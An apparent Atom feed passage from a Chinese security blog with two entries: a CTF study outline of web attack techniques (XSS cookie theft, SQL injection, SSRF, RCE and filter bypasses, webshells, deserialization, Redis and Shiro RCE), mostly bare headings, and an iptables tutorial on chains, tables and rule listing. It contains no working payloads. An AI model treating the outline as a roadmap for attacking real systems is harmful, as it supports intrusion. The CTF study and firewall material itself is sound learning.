<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>可惜没如果、m0nk3y‘s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-08-27T14:38:33.200Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF Tricks 总结</title>
    <link href="https://hack-for.fun/a4738b93.html"/>
    <id>https://hack-for.fun/a4738b93.html</id>
    <published>2020-08-27T03:06:06.000Z</published>
    <updated>2020-08-27T14:38:33.200Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>今天要回学校了，回学校也快考实验班了，我C 语言太菜，CTF 也很久没玩了。所以简单总结一下之前有遇到过的CTF 知识。慢慢补充细节和其他内容。</p><h1 id="脚本题-python、php"><a href="#脚本题-python、php" class="headerlink" title="脚本题(python、php)"></a>脚本题(python、php)</h1><h2 id="快速计算并发起HTTP-请求"><a href="#快速计算并发起HTTP-请求" class="headerlink" title="快速计算并发起HTTP 请求"></a>快速计算并发起HTTP 请求</h2><h2 id="快速处理数据"><a href="#快速处理数据" class="headerlink" title="快速处理数据"></a>快速处理数据</h2><h2 id="在大量数据中获取指定内容"><a href="#在大量数据中获取指定内容" class="headerlink" title="在大量数据中获取指定内容"></a>在大量数据中获取指定内容</h2><h2 id="php-伪随机数安全"><a href="#php-伪随机数安全" class="headerlink" title="php 伪随机数安全"></a>php 伪随机数安全</h2><p>比较常见的就是seed 爆破。</p><h2 id="加密算法可破解"><a href="#加密算法可破解" class="headerlink" title="加密算法可破解"></a>加密算法可破解</h2><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><h2 id="XSS-打cookie的姿势"><a href="#XSS-打cookie的姿势" class="headerlink" title="XSS 打cookie的姿势"></a>XSS 打cookie的姿势</h2><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="有回显XXE"><a href="#有回显XXE" class="headerlink" title="有回显XXE"></a>有回显XXE</h2><h2 id="blind-XXE"><a href="#blind-XXE" class="headerlink" title="blind XXE"></a>blind XXE</h2><h2 id="oob"><a href="#oob" class="headerlink" title="oob"></a>oob</h2><h2 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h2><h1 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h1><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h2><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h2 id="读、写文件"><a href="#读、写文件" class="headerlink" title="读、写文件"></a>读、写文件</h2><h2 id="Oracle-mssql"><a href="#Oracle-mssql" class="headerlink" title="Oracle \ mssql"></a>Oracle \ mssql</h2><h2 id="bypass-2"><a href="#bypass-2" class="headerlink" title="bypass"></a>bypass</h2><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-探测内网主机存活"><a href="#SSRF-探测内网主机存活" class="headerlink" title="SSRF 探测内网主机存活"></a>SSRF 探测内网主机存活</h2><h2 id="SSRF-文件读取"><a href="#SSRF-文件读取" class="headerlink" title="SSRF 文件读取"></a>SSRF 文件读取</h2><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="常规RCE"><a href="#常规RCE" class="headerlink" title="常规RCE"></a>常规RCE</h2><h2 id="Bypass-disable-functions"><a href="#Bypass-disable-functions" class="headerlink" title="Bypass disable_functions"></a>Bypass disable_functions</h2><h2 id="Bypass-open-basedir"><a href="#Bypass-open-basedir" class="headerlink" title="Bypass open_basedir"></a>Bypass open_basedir</h2><h2 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><h2 id="限制字符长度的RCE"><a href="#限制字符长度的RCE" class="headerlink" title="限制字符长度的RCE"></a>限制字符长度的RCE</h2><h2 id="无回显RCE、OOB"><a href="#无回显RCE、OOB" class="headerlink" title="无回显RCE、OOB"></a>无回显RCE、OOB</h2><p>ceye，dnslog、burp</p><h1 id="File-Inclusion-、Arbitary-File-Reading"><a href="#File-Inclusion-、Arbitary-File-Reading" class="headerlink" title="File Inclusion 、Arbitary File Reading"></a>File Inclusion 、Arbitary File Reading</h1><h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><h2 id="临时文件包含-php-session-文件包含-sess-token，upload-progress"><a href="#临时文件包含-php-session-文件包含-sess-token，upload-progress" class="headerlink" title="临时文件包含(php session 文件包含.. sess_token，upload_progress)"></a>临时文件包含(php session 文件包含.. sess_token，upload_progress)</h2><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h2 id="Tomcat-AJP-文件包含、文件读取漏洞"><a href="#Tomcat-AJP-文件包含、文件读取漏洞" class="headerlink" title="Tomcat AJP 文件包含、文件读取漏洞"></a>Tomcat AJP 文件包含、文件读取漏洞</h2><h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="phar-文件上传GetShell"><a href="#phar-文件上传GetShell" class="headerlink" title="phar 文件上传GetShell"></a>phar 文件上传GetShell</h2><h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><h2 id="bypass的几种方法"><a href="#bypass的几种方法" class="headerlink" title="bypass的几种方法"></a>bypass的几种方法</h2><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="git-svn-DS-Store-bak-swp-php-zip-rar-xml-INF"><a href="#git-svn-DS-Store-bak-swp-php-zip-rar-xml-INF" class="headerlink" title=".git .svn .DS_Store .bak .swp .php~ .zip .rar .xml .INF"></a>.git .svn .DS_Store .bak .swp .php~ .zip .rar .xml .INF</h2><h2 id="配置文件泄露、-bash-history"><a href="#配置文件泄露、-bash-history" class="headerlink" title="配置文件泄露、.bash_history"></a>配置文件泄露、.bash_history</h2><h1 id="HTTP、HTTPS、分块传输"><a href="#HTTP、HTTPS、分块传输" class="headerlink" title="HTTP、HTTPS、分块传输"></a>HTTP、HTTPS、分块传输</h1><h2 id="302-跳转"><a href="#302-跳转" class="headerlink" title="302 跳转"></a>302 跳转</h2><h2 id="XFF-、Referer-、等常见HTTP-Header-知识点"><a href="#XFF-、Referer-、等常见HTTP-Header-知识点" class="headerlink" title="XFF 、Referer 、等常见HTTP Header 知识点"></a>XFF 、Referer 、等常见HTTP Header 知识点</h2><h2 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h2><h1 id="Serialize-unserialize-php-python-java"><a href="#Serialize-unserialize-php-python-java" class="headerlink" title="Serialize unserialize(php,python,java)"></a>Serialize unserialize(php,python,java)</h1><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup 绕过"></a>__wakeup 绕过</h2><h2 id="O-的-bypass"><a href="#O-的-bypass" class="headerlink" title=":O: 的 bypass"></a><code>:O:</code> 的 bypass</h2><h2 id="Phar-拓展反序列化攻击链"><a href="#Phar-拓展反序列化攻击链" class="headerlink" title="Phar 拓展反序列化攻击链"></a>Phar 拓展反序列化攻击链</h2><h2 id="字符串逃逸、对象逃逸"><a href="#字符串逃逸、对象逃逸" class="headerlink" title="字符串逃逸、对象逃逸"></a>字符串逃逸、对象逃逸</h2><h2 id="pop-链子构造"><a href="#pop-链子构造" class="headerlink" title="pop 链子构造"></a>pop 链子构造</h2><h2 id="python-pickle库-反序列化"><a href="#python-pickle库-反序列化" class="headerlink" title="python pickle库 反序列化"></a>python pickle库 反序列化</h2><h2 id="Java-Weblogic-Shiro-等各种反序列化漏洞"><a href="#Java-Weblogic-Shiro-等各种反序列化漏洞" class="headerlink" title="Java Weblogic\Shiro\等各种反序列化漏洞"></a>Java Weblogic\Shiro\等各种反序列化漏洞</h2><h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h2 id="Vm2-逃逸"><a href="#Vm2-逃逸" class="headerlink" title="Vm2 逃逸"></a>Vm2 逃逸</h2><h2 id="safe-eval"><a href="#safe-eval" class="headerlink" title="safe-eval"></a>safe-eval</h2><h2 id="jwt-token-伪造"><a href="#jwt-token-伪造" class="headerlink" title="jwt token 伪造"></a>jwt token 伪造</h2><h2 id="nodejs代码审计"><a href="#nodejs代码审计" class="headerlink" title="nodejs代码审计"></a>nodejs代码审计</h2><h1 id="DeBug-模式情况下存在的漏洞情景"><a href="#DeBug-模式情况下存在的漏洞情景" class="headerlink" title="DeBug 模式情况下存在的漏洞情景"></a>DeBug 模式情况下存在的漏洞情景</h1><h2 id="python-Flask-Debug-Mode-pin-码导致利用popen-RCE"><a href="#python-Flask-Debug-Mode-pin-码导致利用popen-RCE" class="headerlink" title="python Flask Debug Mode pin 码导致利用popen RCE"></a>python Flask Debug Mode pin 码导致利用popen RCE</h2><h1 id="第三方库安全"><a href="#第三方库安全" class="headerlink" title="第三方库安全"></a>第三方库安全</h1><h2 id="Fastjson-RCE"><a href="#Fastjson-RCE" class="headerlink" title="Fastjson RCE"></a>Fastjson RCE</h2><h2 id="Shiro-RememberMe-Cookie-处的-RCE-身份鉴权绕过"><a href="#Shiro-RememberMe-Cookie-处的-RCE-身份鉴权绕过" class="headerlink" title="Shiro RememberMe Cookie 处的 RCE \ 身份鉴权绕过"></a>Shiro RememberMe Cookie 处的 RCE \ 身份鉴权绕过</h2><h2 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h2><h2 id="Redis-主从复制RCE-未授权-、gopher-dict-协议的利用"><a href="#Redis-主从复制RCE-未授权-、gopher-dict-协议的利用" class="headerlink" title="Redis 主从复制RCE \ 未授权 、gopher dict 协议的利用"></a>Redis 主从复制RCE \ 未授权 、gopher dict 协议的利用</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;今天要回学校了，回学校也快考实验班了，我C 语言太菜，CTF 也很久没玩了。所以简单总结一下之前有遇到过的CTF 知识。慢慢补充细节和其他内容。&lt;/p&gt;
&lt;h1 id=&quot;脚本题-python、php&quot;&gt;&lt;a href=&quot;#脚本题-python、ph</summary>
      
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>iptables 学习</title>
    <link href="https://hack-for.fun/13bb2df2.html"/>
    <id>https://hack-for.fun/13bb2df2.html</id>
    <published>2020-08-26T07:17:09.000Z</published>
    <updated>2020-08-26T15:25:09.938Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料： </p><p>(内容和图片)</p><p>全教程系列</p><p><a href="http://www.zsythink.net/archives/tag/iptables/">iptables 入门系列</a></p><blockquote><p>作为安全狗 ，自认为知道概念和基础操作就行了（搞安全的要学的东西真的太多了。</p></blockquote><p>原作者一开始讲了防火墙的知识，算不错的科普。</p><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><blockquote><p>从逻辑上讲。防火墙可以大体分为主机防火墙和网络防火墙。</p></blockquote><p>主机防火墙：针对于单个主机进行防护。</p><p>网络防火墙：往往处于网络入口或边缘，针对于网络入口进行防护，服务于防火墙背后的本地局域网。</p><p>网络防火墙和主机防火墙并不冲突，可以理解为，网络防火墙主外（集体）， 主机防火墙主内（个人）。</p><hr><blockquote><p>从物理上讲，防火墙可以分为硬件防火墙和软件防火墙。</p></blockquote><p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p><p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。</p><p>而渗透测试过程中，常常会遇见WAF，Web Application Firewall（Web 应用防火墙。比如长亭的雷池（SafeLine），基于语义分析，非常厉害，要是遇到了就别想怎么绕了（×</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p><code>iptables</code> 只有Linux 系的系统才有。</p><p><strong>iptables</strong>其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter</strong></p><p>netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。</p><p>iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。</p><p>netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成<code>封包过滤</code>、<code>封包重定向</code>和<code>网络地址转换（NAT）</code>等功能。</p><p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p><ul><li><p>网络地址转换(Network Address Translate)</p></li><li><p>数据包内容修改</p></li><li><p>数据包过滤的防火墙功能</p></li></ul><p>所以说，虽然我们使用service iptables start启动iptables”服务”，但是其实准确的来说，iptables并<code>没有一个守护进程</code>，所以并不能算是真正意义上的服务，而应该算是<code>内核提供的功能</code>。</p><h2 id="Iptables-基础"><a href="#Iptables-基础" class="headerlink" title="Iptables 基础"></a>Iptables 基础</h2><p>Iptables 是按照“规则”办事的，规则其实就是网络管理员预定义的条件，规则一般的定义为<code>&quot;如果数据包头符合这样的条件，就这样处理这个数据包&quot;</code>。</p><blockquote><p>规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的主要工作就是添加、修改和删除这些规则。</p></blockquote><p>当客户端访问服务器的web服务时，客户端发送报文到网卡，而<strong>tcp/ip协议栈是属于内核的一部分</strong>，所以，客户端的信息会通过内核的TCP协议传输到用户空间中的web服务中，而此时，客户端报文的目标终点为web服务所监听的套接字（IP：Port）上，当web服务需要响应客户端请求时，web服务发出的响应报文的目标终点则为客户端，这个时候，web服务所监听的IP与端口反而变成了原点，我们说过，netfilter才是真正的防火墙，它是内核的一部分，所以，如果我们想要防火墙能够达到”防火”的目的，则需要在内核中设置关卡，所有进出的报文都要通过这些关卡，经过检查后，符合放行条件的才能放行，符合阻拦条件的则需要被阻止，于是，就出现了input关卡和output关卡，<strong>而这些关卡在iptables中不被称为”关卡”,而被称为”链”。</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png"></p><p>上面描述的场景并不完善，因为<strong>客户端发来的报文访问的目标地址可能并不是本机，而是其他服务器，当本机的内核支持IP_FORWARD时，我们可以将报文转发给其他服务器</strong>，所以，这个时候，我们就会提到iptables中的其他”关卡”，也就是其他”链”，他们就是  “路由前”、”转发”、”路由后”，他们的英文名是</p><p>PREROUTING、FORWARD、POSTROUTING</p><p>根据实际情况的不同，报文经过”链”可能不同。<strong>如果报文需要转发，那么报文则不会经过input链发往用户空间，而是直接在内核空间中经过forward链和postrouting链转发出去的。</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png"></p><p>常见场景中报文的流向：</p><ul><li><p>到本机某进程的报文：PREROUTING –&gt; INPUT</p></li><li><p>由本机转发的报文：PREROUTING –&gt; FORWARD –&gt; POSTROUTING</p></li><li><p>由本机的某进程发出报文（通常为响应报文）：OUTPUT –&gt; POSTROUTING</p></li></ul><h2 id="链的概念"><a href="#链的概念" class="headerlink" title="链的概念"></a>链的概念</h2><p>为什么“关卡” 在 iptables 中被称做“链：</p><p>防火墙的作用就在于对经过报文匹配“规则”，然后执行相对应的“动作”。然而关卡上不只只有一条规则，而且有很多条规则，当我们把这些规则串到一个链条上的时候，就形成了”链”。</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png"></p><p>每个经过这个”关卡”的报文，都要将这条”链”上的所有规则匹配一遍，如果有符合条件的规则，则执行规则对应的动作。</p><h2 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h2><blockquote><p>我们再想想另外一个问题，我们对每个”链”上都放置了一串规则，但是这些规则有些很相似，比如，A类规则都是对IP或者端口的过滤，B类规则是修改报文，那么这个时候，我们是不是能<strong>把实现相同功能的规则放在一起</strong>呢，必须能的。</p></blockquote><p>把具有相同功能的规则的集合叫做”表”，所以说，不同功能的规则，我们可以放置在不同的表中进行管理，而iptables已经为我们定义了4种表，每种表对应了不同的功能，而我们定义的规则也都逃脱不了这4种功能的范围，所以，学习iptables之前，我们必须先搞明白每种表 的作用。</p><p>iptables为我们提供了如下规则的分类，或者说，iptables为我们提供了如下”表”</p><ul><li><p>filter表：负责过滤功能，防火墙；内核模块：iptables_filter</p></li><li><p>nat表：network address translation，网络地址转换功能；内核模块：iptable_nat</p></li><li><p>mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle</p></li><li><p>raw表：关闭nat表上启用的连接追踪机制；iptable_raw</p></li></ul><p>也就是说，我们自定义的所有规则，都是这四种分类中的规则，或者说，所有规则都存在于这4张”表”中。</p><p></p><h2 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h2><blockquote><p>某些“链”中注定不会包含“某类规则”。</p></blockquote><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="prerouting链上的规则存在的表情况"></p><blockquote><p>prerouting”链”只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中</p></blockquote><p>PREROUTING    的规则可以存在于：raw表，mangle表，nat表。</p><p>INPUT      的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p><p>FORWARD     的规则可以存在于：mangle表，filter表。</p><p>OUTPUT     的规则可以存在于：raw表mangle表，nat表，filter表。</p><p>POSTROUTING    的规则可以存在于：mangle表，nat表。</p><p><strong>在实际的使用过程中，往往是通过”表”作为操作入口，对规则进行定义的</strong>，之所以按照上述过程介绍iptables，是因为从”关卡”的角度更容易从入门的角度理解，但是为了以便在实际使用的时候，更加顺畅的理解它们，此处我们还要将各”表”与”链”的关系罗列出来，</p><p>表（功能）&lt;–&gt;  链（钩子）：</p><p>raw   表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p><p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p><p>nat   表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p><p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p><hr><p>其实我们还需要注意一点，因为数据包经过一个”链”的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，我们应该一条一条的去匹配，而且我们说过，相同功能类型的规则会汇聚在一张”表”中，那么，哪些”表”中的规则会放在”链”的最前面执行呢，这时候就需要有一个优先级的问题，我们还拿prerouting”链”做图示。<br><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_5.png"></p><p>prerouting链中的规则存放于三张表中，而这三张表中的规则执行的优先级如下：</p><p>raw –&gt; mangle –&gt; nat</p><p>但是我们知道，<strong>iptables为我们定义了4张”表”,当他们处于同一条”链”时，执行的优先级如下。</strong></p><p>优先级次序（由高而低）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw --&gt; mangle --&gt; nat --&gt; filter</span><br></pre></td></tr></table></figure><p>前面说过，某些链天生就不能使用某些表中的规则，所以，<strong>4张表中的规则处于同一条链的目前只有output链</strong>，它就是传说中海陆空都能防守的关卡。</p><h2 id="数据经过防火墙的流程"><a href="#数据经过防火墙的流程" class="headerlink" title="数据经过防火墙的流程"></a>数据经过防火墙的流程</h2><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png"></p><p>我们将经常用到的对应关系重新写在此处，方便对应图例查看。</p><p>链的规则存放于哪些表中（从链到表的对应关系）：</p><p>PREROUTING  的规则可以存在于：raw表，mangle表，nat表。</p><p>INPUT     的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p><p>FORWARD    的规则可以存在于：mangle表，filter表。</p><p>OUTPUT    的规则可以存在于：raw表mangle表，nat表，filter表。</p><p>POSTROUTING  的规则可以存在于：mangle表，nat表。</p><hr><p>表中的规则可以被哪些链使用（从表到链的对应关系）：</p><p>raw   表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p><p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p><p>nat   表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p><p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p><p>下图中nat表在centos7中的情况就不再标明。</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png"></p><h2 id="规则的概念"><a href="#规则的概念" class="headerlink" title="规则的概念"></a>规则的概念</h2><p>规则：根据指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理</p><p>规则由匹配条件和处理动作组成。</p><ul><li>匹配条件</li></ul><p>匹配条件分为基本匹配条件与扩展匹配条件</p><p><strong>基本匹配条件：</strong></p><p>源地址Source IP，目标地址 Destination IP</p><p>上述内容都可以作为基本匹配条件。</p><p><strong>扩展匹配条件：</strong></p><p>除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。</p><p>源端口Source Port, 目标端口Destination Port</p><p>上述内容都可以作为扩展匹配条件</p><ul><li>处理动作</li></ul><p>处理动作在iptables中被称为target（这样说并不准确，我们暂且这样称呼），动作也可以分为基本动作和扩展动作。</p><p>此处列出一些常用的动作，之后的文章会对它们进行详细的示例与总结：</p><p><strong>ACCEPT</strong>：允许数据包通过。</p><p><strong>DROP</strong>：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</p><p><strong>REJECT</strong>：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</p><p><strong>SNAT</strong>：源地址转换，解决内网用户用同一个公网地址上网的问题。</p><p><strong>MASQUERADE</strong>：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</p><p><strong>DNAT</strong>：目标地址转换。</p><p><strong>REDIRECT</strong>：在本机做端口映射。</p><p><strong>LOG</strong>：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</p><h1 id="iptables-实际操作之规则查询"><a href="#iptables-实际操作之规则查询" class="headerlink" title="iptables 实际操作之规则查询"></a>iptables 实际操作之规则查询</h1><p>iptables为我们预定义了4张表，它们分别是raw表、mangle表、nat表、filter表，不同的表拥有不同的功能。</p><p>filter负责过滤功能，比如允许哪些IP地址访问，拒绝哪些IP地址访问，允许访问哪些端口，禁止访问哪些端口，filter表会根据我们定义的规则进行过滤，filter表应该是我们最常用到的表了，所以此处，我们以filter表为例，开始学习怎样实际操作iptables。</p><ul><li>查看filter 表中的规则</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L</span><br></pre></td></tr></table></figure><p>使用-t选项，指定要操作的表，使用-L选项，查看-t选项对应的表的规则，-L选项的意思是，列出规则，所以，上述命令的含义为列出filter表的所有规则</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826222419.png" alt="image-20200826222325023"></p><p>从上图中可以看出，INPUT链、FORWARD链、OUTPUT链都拥有”过滤”的能力，所以，当我们要定义某条”过滤”的规则时，我们会在filter表中定义，但是具体在哪条”链”上定义规则呢？这取决于我们的工作场景。比如，<strong>我们需要禁止某个IP地址访问我们的主机，我们则需要在INPUT链上定义规则。因为，我们在理论总结中已经提到过，报文发往本机时，会经过PREROUTING链与INPUT链，如果我们想要禁止某些报文发往本机，我们只能在PREROUTING链和INPUT链中定义规则，但是PREROUTING链并不存在于filter表中，换句话说就是，PREROUTING关卡天生就没有过滤的能力，所以，我们只能在INPUT链中定义</strong>，当然，如果是其他工作场景，可能需要在FORWARD链或者OUTPUT链中定义过滤规则。</p><p>查询其他表中的规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line"></span><br><span class="line">iptables -t mangle -L</span><br><span class="line"></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p>可以省略-t filter，当没有使用-t选项指定表时，默认为操作filter表，即iptables -L表示列出filter表中的所有规则。</p><ul><li>查询指定表中指定链的规则</li></ul><p>因为我的vps 没有配置iptables，所以图片就直接抄。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT(注意大小写)</span><br><span class="line">查询更详细的数据可以使用-v 选项</span><br><span class="line">iptables -vL INPUT</span><br></pre></td></tr></table></figure><p><code>pkts bytes target     prot opt in     out     source               destination        </code></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_3.png"></p><p><strong>pkts</strong>:对应规则匹配到的报文的个数。</p><p><strong>bytes</strong>:对应匹配到的报文包的大小总和。</p><p><strong>target</strong>:规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。</p><p><strong>prot</strong>:表示规则对应的协议，是否只针对某些协议应用此规则。</p><p><strong>opt</strong>:表示规则对应的选项。</p><p><strong>in</strong>:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。</p><p><strong>out</strong>:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。</p><p><strong>source</strong>:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。</p><p><strong>destination</strong>:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。</p><p>上图中的源地址与目标地址都为anywhere，看来，iptables默认为我们进行了名称解析，但是在规则非常多的情况下如果进行名称解析，效率会比较低，所以，在没有此需求的情况下，我们可以<strong>使用-n选项，表示不对IP地址进行名称反解，直接显示IP地址</strong>，示例如下。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_4.png"></p><p>如上图所示，规则中的源地址与目标地址已经显示为IP，而非转换后的名称。</p><p>使用<code>--line-numbers</code> 即可显示规则的编号</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826224157.png" alt="image-20200826224155655"></p><p>如图，每个链的后面都有一个括号，括号后面有一些信息：</p><p><strong>policy</strong>表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT</p><p><strong>packets</strong>表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 packets表示默认策略匹配到0个包。</p><p><strong>bytes</strong>表示当前链默认策略匹配到的所有包的大小总和。</p><p>其实，我们可以把packets与bytes称作”计数器”，上图中的计数器记录了默认策略匹配到的报文数量与总大小，”计数器”只会在使用-v选项时，才会显示出来。</p><p>如果要查看更精确的计数值，可以使用<code>-x</code>选项。</p><h1 id="Iptables-规则管理"><a href="#Iptables-规则管理" class="headerlink" title="Iptables 规则管理"></a>Iptables 